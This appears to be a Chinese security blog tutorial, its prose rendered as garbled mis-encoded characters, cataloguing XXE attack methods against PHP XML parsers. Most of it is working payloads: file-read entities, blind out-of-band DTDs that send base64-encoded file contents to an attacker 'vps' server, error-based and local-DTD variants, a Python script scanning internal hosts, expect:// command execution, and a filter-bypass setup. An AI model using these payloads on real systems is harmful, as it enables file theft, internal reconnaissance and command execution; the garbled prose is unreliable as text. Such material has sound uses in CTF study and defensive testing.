<h1 id="XXEçš„å‡ ç§åˆ©ç”¨æ–¹å¼"><a href="#XXEçš„å‡ ç§åˆ©ç”¨æ–¹å¼" class="headerlink" title="XXEçš„å‡ ç§åˆ©ç”¨æ–¹å¼"></a>XXEçš„å‡ ç§åˆ©ç”¨æ–¹å¼</h1><h2 id="æœ‰å›æ˜¾ä»»æ„æ–‡ä»¶è¯»å–-Normal-Based-XXE"><a href="#æœ‰å›æ˜¾ä»»æ„æ–‡ä»¶è¯»å–-Normal-Based-XXE" class="headerlink" title="æœ‰å›æ˜¾ä»»æ„æ–‡ä»¶è¯»å–(Normal Based XXE)"></a>æœ‰å›æ˜¾ä»»æ„æ–‡ä»¶è¯»å–(Normal Based XXE)</h2><p>æœåŠ¡èƒ½æ¥æ”¶å¹¶è§£æ XML æ ¼å¼çš„è¾“å…¥å¹¶ä¸”æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±èƒ½è¾“å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„ XML ä»£ç ï¼Œé€šè¿‡å¼•ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•ï¼Œå¼•ç”¨æœåŠ¡å™¨ä¸Šé¢çš„æ–‡ä»¶</p>
<p>xxe.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//è·å–å®¢æˆ·ç«¯è¾“å…¥å†…å®¹</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();    <span class="hljs-comment">//åˆå§‹åŒ–XMLè§£æå™¨</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="hljs-comment">//åŠ è½½å®¢æˆ·ç«¯è¾“å…¥çš„XMLå†…å®¹</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);  <span class="hljs-comment">//è·å–XMLæ–‡æ¡£èŠ‚ç‚¹ï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›SimpleXMLElementå¯¹è±¡ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›FALSE</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/xxe-1.png"></p>
<h3 id="ç‰¹æ®Šç¬¦å·"><a href="#ç‰¹æ®Šç¬¦å·" class="headerlink" title="ç‰¹æ®Šç¬¦å·"></a>ç‰¹æ®Šç¬¦å·</h3><p>å¦‚æœè¯»å–çš„æ–‡ä»¶ä¸­åŒ…å«ç‰¹æ®Šç¬¦å·ï¼Œæ¯”å¦‚<code>&lt;</code>ã€<code>&gt;</code>ã€<code>&amp;</code>ã€<code>&quot;</code>ã€<code>&#39;</code>ç­‰ï¼Œå°±ä¼šè¿”å›ä¸€äº›æŠ¥é”™ä¿¡æ¯</p>
<p>è¿™æ—¶å¯ä»¥ä½¿ç”¨<code>CDATA</code>æˆ–è€…<code>base64 convert</code></p>
<p>æœ¯è¯­<code>CDATA</code>æŒ‡çš„æ˜¯ä¸åº”ç”±<code>XMLè§£æå™¨</code>è¿›è¡Œè§£æçš„æ–‡æœ¬æ•°æ®<code>ï¼ˆUnparsed Character Dataï¼‰</code><br><code>CDATA</code>éƒ¨åˆ†ç”±<code>&quot;&lt;![CDATA[&quot;</code>å¼€å§‹ï¼Œç”±<code>&quot;]]&gt;&quot;</code>ç»“æŸï¼Œè§£æå™¨ä¼šå¿½ç•¥<code>CDATA</code>éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å®¹</p>
<p>æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯æŠŠè¯»å–çš„æ–‡ä»¶æ”¾åœ¨CDATAä¸­ä¹‹åå†è°ƒç”¨</p>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span></span><br><span class="hljs-meta">[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">start</span></span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM &quot;</span>file:///flag<span class="hljs-string">&quot;&gt; ]]&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">&gt;</span>]</span><br><span class="hljs-meta">% <span class="hljs-keyword">xxe</span>;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;start<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¸è¿‡ä½¿ç”¨è¿™ä¸ªpayloadè¯»æ–‡ä»¶æ—¶è¿˜æ˜¯ä¼šæŠ¥é”™ï¼Œå› ä¸ºåœ¨<code>xml</code>ä¸­ï¼Œ<code>xml</code>è§£æå™¨æœ‰ä¸ªé™åˆ¶ï¼šä¸èƒ½åœ¨å†…éƒ¨<code>Entity</code>ä¸­å¼•ç”¨ï¼Œ<code>â€œPEReferences forbidden in internal subset in Entity â€</code>æŒ‡çš„å°±æ˜¯ç¦æ­¢å†…éƒ¨å‚æ•°å®ä½“å¼•ç”¨</p>
<p>æ‰€ä»¥éœ€è¦è°ƒç”¨çš„å¤–éƒ¨çš„<code>dtd</code></p>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">go</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span>%dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%go;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/xxe-2.png"></p>
<h2 id="æ— å›æ˜¾ä»»æ„æ–‡ä»¶è¯»å–-Blind-Based-XXE"><a href="#æ— å›æ˜¾ä»»æ„æ–‡ä»¶è¯»å–-Blind-Based-XXE" class="headerlink" title="æ— å›æ˜¾ä»»æ„æ–‡ä»¶è¯»å–(Blind Based XXE)"></a>æ— å›æ˜¾ä»»æ„æ–‡ä»¶è¯»å–(Blind Based XXE)</h2><p>xxe.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="å‡ºç½‘"><a href="#å‡ºç½‘" class="headerlink" title="å‡ºç½‘"></a>å‡ºç½‘</h3><p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port?a=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>vpsä¸Šç›‘å¬å¯¹åº”çš„ç«¯å£</p>
<p><img src="/img/summary/xxe-3.png"></p>
<p>å…ˆè°ƒç”¨äº†<code>%remote</code>ï¼Œè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„<code>evil.dtd</code>ï¼Œç±»ä¼¼phpçš„<code>include</code>ï¼Œç„¶å<code>%int</code>è°ƒç”¨<code>%file</code>ï¼Œ<code>%file</code>è·å–æ•æ„Ÿæ–‡ä»¶åå°†ç»“æœå¡«å…¥åˆ°<code>%send</code>ï¼Œæœ€åè°ƒç”¨<code>%send</code>æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œè¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼Œè¦æ³¨æ„å®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰<code>%</code>, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç </p>
<h3 id="ä¸å‡ºç½‘"><a href="#ä¸å‡ºç½‘" class="headerlink" title="ä¸å‡ºç½‘"></a>ä¸å‡ºç½‘</h3><p>ä»¥ä¸Šéƒ½æ˜¯å¼•å…¥å¤–éƒ¨æœåŠ¡å™¨çš„<code>OOB XXEï¼ˆOut-of-bandï¼‰</code>ï¼Œè™½ç„¶å¥½ç”¨ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªè½¯è‚‹ã€‚å½“æœåŠ¡å™¨é…ç½®å¥½é˜²ç«å¢™ï¼Œç¦æ­¢æœåŠ¡å™¨è¯·æ±‚å¤–ç½‘dtdæ–‡ä»¶çš„è¯ï¼Œå°±æ— æ³•æ¥å—åˆ°æ•°æ®äº†ã€‚</p>
<p>è¿™æ—¶å€™å°±å¯ä»¥è€ƒè™‘åˆ©ç”¨æœ¬åœ°dtdæ¥è¿›è¡ŒXXE</p>
<p>linux</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27;Your DTD code&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure>


<p>windows</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://C:/Windows/System32/wbem/xml/cim20.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">SuperClass</span> <span class="hljs-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure>

<p>å¼•ç”¨å†…éƒ¨å®ä½“payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamso</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;send;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">    &#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>1234<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure>





<h2 id="åŸºäºæŠ¥é”™çš„XXE-Error-Based-XXE"><a href="#åŸºäºæŠ¥é”™çš„XXE-Error-Based-XXE" class="headerlink" title="åŸºäºæŠ¥é”™çš„XXE(Error Based XXE)"></a>åŸºäºæŠ¥é”™çš„XXE(Error Based XXE)</h2><p>åŸºäºæŠ¥é”™çš„åŸç†å’ŒOOBç±»ä¼¼ï¼ŒOOBé€šè¿‡æ„é€ ä¸€ä¸ªå¸¦å¤–çš„urlå°†æ•°æ®å¸¦å‡ºï¼Œè€ŒåŸºäºæŠ¥é”™æ˜¯æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚</p>
<p>å‡ºç½‘payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;https://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">    %error;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; error SYSTEM &#x27;file:///fakefile/%file;&#x27;&gt;&quot;</span>&gt;</span><br>%start;<br></code></pre></td></tr></table></figure>



<p>ä¸å‡ºç½‘å¦‚æœå¯ä»¥å†™æ–‡ä»¶çš„è¯å°±å¯ä»¥æ„é€ æœ¬åœ°æ¶æ„dtd</p>
<p>ä¸å‡ºç½‘payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///tmp/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;aaa)&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %local_dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>flag<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&quot;and | or | not | equal | contains | exists | subdomain-of&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">pattern</span> (%<span class="hljs-keyword">condition</span>;)&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="æ¢æµ‹å†…ç½‘ä¸»æœºä¸ç«¯å£"><a href="#æ¢æµ‹å†…ç½‘ä¸»æœºä¸ç«¯å£" class="headerlink" title="æ¢æµ‹å†…ç½‘ä¸»æœºä¸ç«¯å£"></a>æ¢æµ‹å†…ç½‘ä¸»æœºä¸ç«¯å£</h2><p>åˆ©ç”¨httpåè®®å’Œç½‘é¡µå“åº”æ—¶é—´æ¥åˆ¤æ–­ä¸»æœºå­˜æ´»</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XXE</span>(<span class="hljs-params">ip,string</span>):<br>    <span class="hljs-keyword">try</span>:<br>        xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>        x = requests.post(<span class="hljs-string">&#x27;http://192.168.91.134/xml.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>        coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [+]&#x27;</span>,ip,<span class="hljs-string">&#x27;Successfully Found !!!&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [-]&#x27;</span>,ip,<span class="hljs-string">&#x27;Error Not Found !!!&#x27;</span>)<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">130</span>,<span class="hljs-number">150</span>):<br>        ip = <span class="hljs-string">&#x27;192.168.91.&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        XXE(ip,string)<br></code></pre></td></tr></table></figure>


<p>æ ¹æ®è¿”å›å†…å®¹çš„ä¸åŒæ¥åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€å¯</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.91.149:80&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">xxe</span> (<span class="hljs-keyword">#PCDATA</span>) &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span>666<span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h2><p>åœ¨å®‰è£…<code>expect</code>æ‰©å±•çš„<code>PHP</code>ç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨<code>utf-16</code>ç¼–ç ç»•è¿‡</p>
